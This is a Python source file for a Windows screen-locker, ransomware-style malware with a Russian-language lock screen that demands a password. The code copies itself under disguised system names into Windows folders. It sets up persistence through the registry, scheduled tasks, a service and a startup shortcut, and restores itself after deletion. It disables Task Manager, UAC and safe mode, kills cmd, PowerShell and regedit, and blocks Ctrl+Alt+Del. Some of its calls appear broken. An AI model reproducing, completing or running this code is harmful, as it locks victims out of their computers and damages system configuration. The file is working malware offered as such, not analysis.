import os
import sys
import time
import ctypes
import winreg
import subprocess
import threading
import shutil
import psutil
import keyboard
from ctypes import wintypes, byref, c_int, c_void_p, POINTER, c_ulong, c_bool
import win32api
import win32con
import win32security
import win32file
import win32process
import win32service
import win32serviceutil

UNLOCK_PASSWORD = "777"
PROCESS_NAME = "SystemLocker.exe"
REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
SERVICE_NAME = "SystemLockerService"

def create_duplicates():
    locations = [
        r"C:\Windows\System32\svchost.exe.bak",
        r"C:\Windows\SysWOW64\explorer.exe.bak",
        r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\system.exe",
        os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'system.exe'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Temp', 'winlogon.exe')
    ]
    
    current_file = os.path.abspath(sys.argv[0])
    for loc in locations:
        try:
            shutil.copy2(current_file, loc)
            ctypes.windll.kernel32.SetFileAttributesW(loc, 2)  # Скрытый
            # Добавляем в автозагрузку через планировщик
            subprocess.run(
                f'schtasks /create /tn "System_{hash(loc)}" /tr "{loc}" /sc onlogon /f',
                shell=True,
                capture_output=True
            )
        except:
            pass
create_duplicates()


def block_safe_mode():
    try:
        import keyboard
        keyboard.add_hotkey('f8', lambda: None, suppress=True)
        
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Control\SafeBoot",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "Minimal", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, "Network", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        # Блокируем возможность входа в безопасный режим через msconfig
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except:
        pass

def self_repair():
    current_file = os.path.abspath(sys.argv[0])
    backup_dir = os.path.join(os.environ['TEMP'], 'SystemLocker')
    backup_file = os.path.join(backup_dir, 'locker.exe')
    
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)
    
    try:
        shutil.copy2(current_file, backup_file)
        
        ctypes.windll.kernel32.SetFileAttributesW(backup_file, 2)  # FILE_ATTRIBUTE_HIDDEN
    except:
        pass
    
    def check_and_restore():
        while True:
            if not os.path.exists(current_file):
                if os.path.exists(backup_file):
                    try:
                        shutil.copy2(backup_file, current_file)
                        # Запускаем восстановленный файл
                        os.startfile(current_file)
                    except:
                        pass
            time.sleep(10)
    
    threading.Thread(target=check_and_restore, daemon=True).start()

def block_ctrl_alt_del():
    try:
        ctypes.windll.advapi32.SetServiceObjectSecurity(
            ctypes.windll.advapi32.OpenSCManagerW(None, None, 0xF003F),
            None,
            None
        )
        
        import ctypes.wintypes
        
        class SASL(ctypes.Structure):
            _fields_ = [
                ("Sasl", ctypes.wintypes.DWORD),
                ("State", ctypes.wintypes.DWORD),
            ]
        
        try:
            hwnd = ctypes.windll.user32.FindWindowW("WindowsShell", None)
            if hwnd:
                ctypes.windll.user32.SetWindowLongW(hwnd, -4, 0)
        except:
            pass
        
        keyboard.add_hotkey('ctrl+alt+del', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl+alt+tab', lambda: None, suppress=True)
        
        os.system("bcdedit /set {current} safeboot network 2>nul")
        os.system("bcdedit /set {current} safeboot minimal 2>nul")
        
    except:
        pass

def disable_task_manager():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        while True:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and 'taskmgr' in proc.info['name'].lower():
                    proc.terminate()
            time.sleep(0.01)
    except:
        pass

def add_to_startup():
    file_path = os.path.abspath(sys.argv[0])
    
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_KEY,
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, PROCESS_NAME, 0, winreg.REG_SZ, f'"{file_path}"')
        winreg.CloseKey(key)
    except:
        pass
    
    try:
        subprocess.run(
            f'schtasks /create /tn "{PROCESS_NAME}" /tr "{file_path}" /sc onlogon /f',
            shell=True,
            capture_output=True
        )
    except:
        pass
    
    try:
        service_path = os.path.join(os.environ['TEMP'], 'system_service.py')
        with open(service_path, 'w') as f:
            f.write(f'''
import os
import sys
sys.path.append(r"{os.path.dirname(file_path)}")
os.chdir(r"{os.path.dirname(file_path)}")
exec(open(r"{file_path}").read())
''')
        
        subprocess.run(
            f'sc create "{SERVICE_NAME}" binPath= "python {service_path}" start= auto',
            shell=True,
            capture_output=True
        )
    except:
        pass
    
    startup_folder = os.path.join(
        os.environ['APPDATA'],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )
    try:
        shortcut_path = os.path.join(startup_folder, f"{PROCESS_NAME}.lnk")
        vbs = f'''
Set WShell = CreateObject("WScript.Shell")
Set Link = WShell.CreateShortcut("{shortcut_path}")
Link.TargetPath = "{file_path}"
Link.WorkingDirectory = "{os.path.dirname(file_path)}"
Link.Save
'''
        with open('create_shortcut.vbs', 'w') as f:
            f.write(vbs)
        subprocess.run('cscript create_shortcut.vbs', shell=True)
        os.remove('create_shortcut.vbs')
    except:
        pass

def block_system_tools():
    blocked_tools = [
        'cmd.exe', 'powershell.exe', 'regedit.exe', 'msconfig.exe',
        'gpedit.msc', 'taskmgr.exe', 'mmc.exe', 'compmgmt.msc',
        'services.msc', 'secpol.msc', 'rsop.msc', 'gpupdate.exe',
        'rundll32.exe', 'wscript.exe', 'cscript.exe', 'reg.exe'
    ]
    
    def kill_blocked():
        while True:
            try:
                for proc in psutil.process_iter(['name', 'pid']):
                    try:
                        if proc.info['name'] and any(tool in proc.info['name'].lower() for tool in blocked_tools):
                            proc.terminate()
                    except:
                        pass
                
                for proc in psutil.process_iter(['name', 'cmdline']):
                    try:
                        if proc.info['name'] == 'cmd.exe':
                            for arg in proc.info['cmdline'] or []:
                                if any(tool in arg.lower() for tool in ['reg', 'bcdedit', 'shutdown']):
                                    proc.terminate()
                    except:
                        pass
            except:
                pass
            time.sleep(0.5)
    
    threading.Thread(target=kill_blocked, daemon=True).start()

class UltimateLocker:
    def __init__(self):
        import tkinter as tk
        from tkinter import font
        self.root = tk.Tk()
        self.root.title("🔒 СИСТЕМА ЗАБЛОКИРОВАНА - УРОВЕНЬ ULTRA")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        self.root.configure(bg='black')
        
        self.root.focus_force()
        self.root.grab_set()
        
        self.create_interface()
        
        self.start_all_protections()
        
        self.root.mainloop()
    
    def create_interface(self):
        self.title_label = tk.Label(
            self.root,
            text="СИСТЕМА ЗАБЛОКИРОВАНА",
            font=("Arial", 36, "bold"),
            bg='black',
            fg='red'
        )
        self.title_label.pack(pady=60)
        
        warning = tk.Label(
            self.root,
            text=" ВНИМАНИЕ! \n"
                 "Все попытки обойти блокировку будут зафиксированы.\n"
                 "Попытки удалить программу приведут к автоматическому восстановлению.\n\n"
                 "Введите пароль для разблокировки:",
            font=("Arial", 18),
            bg='black',
            fg='white'
        )
        warning.pack(pady=30)
        
        self.entry = tk.Entry(
            self.root,
            font=("Arial", 24),
            bg='gray20',
            fg='lime',
            insertbackground='white',
            width=25,
            show='●'
        )
        self.entry.pack(pady=20)
        self.entry.focus_set()
        self.entry.bind("<Return>", self.check_password)
        
        self.attempts_label = tk.Label(
            self.root,
            text="Попыток: 3",
            font=("Arial", 16, "bold"),
            bg='black',
            fg='yellow'
        )
        self.attempts_label.pack(pady=10)
        
        self.status_label = tk.Label(
            self.root,
            text="Система полностью заблокирована",
            font=("Arial", 12),
            bg='black',
            fg='gray'
        )
        self.status_label.pack(side=tk.BOTTOM, pady=20)
        
        self.attempts = 3
    
    def check_password(self, event=None):
        entered = self.entry.get()
        if entered == UNLOCK_PASSWORD:
            self.status_label.config(text="✅ ДОСТУП РАЗРЕШЁН!", fg='lime')
            self.root.update()
            time.sleep(1)
            self.cleanup()
            self.root.destroy()
            sys.exit(0)
        else:
            self.attempts -= 1
            self.entry.delete(0, tk.END)
            self.attempts_label.config(text=f"Попыток: {self.attempts}")
            
            if self.attempts <= 0:
                self.lock_computer()
    
    def lock_computer(self):
        self.status_label.config(text="⛔ ПРЕВЫШЕНО ПОПЫТОК! БЛОКИРОВКА НА 10 МИНУТ", fg='red')
        self.entry.config(state='disabled')
        self.root.update()
        
        for i in range(600, 0, -1):
            self.attempts_label.config(text=f"Осталось: {i//60} мин {i%60} сек")
            self.root.update()
            time.sleep(1)
        
        self.attempts = 3
        self.attempts_label.config(text="Попыток: 3")
        self.entry.config(state='normal')
        self.entry.focus_set()
    
    def start_all_protections(self):
        threading.Thread(target=block_safe_mode, daemon=True).start()
        
        threading.Thread(target=self_repair, daemon=True).start()
        
        threading.Thread(target=block_ctrl_alt_del, daemon=True).start()
        
        threading.Thread(target=disable_task_manager, daemon=True).start()
        
        threading.Thread(target=block_system_tools, daemon=True).start()
        
        threading.Thread(target=add_to_startup, daemon=True).start()
        
        self.protect_process()
    
    def protect_process(self):
        try:
            import win32api
            import win32con
            
            handle = win32api.GetCurrentProcess()
            win32api.SetPriorityClass(handle, win32con.REALTIME_PRIORITY_CLASS)
            
            import ctypes
            ctypes.windll.kernel32.SetProcessCritical(True)
        except:
            pass
    
    def cleanup(self):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                REG_KEY,
                0,
                winreg.KEY_SET_VALUE
            )
            try:
                winreg.DeleteValue(key, PROCESS_NAME)
            except:
                pass
            winreg.CloseKey(key)
            
            os.system(f'sc delete "{SERVICE_NAME}"')
            
            os.system(f'schtasks /delete /tn "{PROCESS_NAME}" /f')
            
            shutil.rmtree(os.path.join(os.environ['TEMP'], 'SystemLocker'), ignore_errors=True)
        except:
            pass

if __name__ == "__main__":
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit()
        
        locker = UltimateLocker()
        
    except Exception as e:
        with open("locker_error.txt", "w") as f:
            f.write(str(e))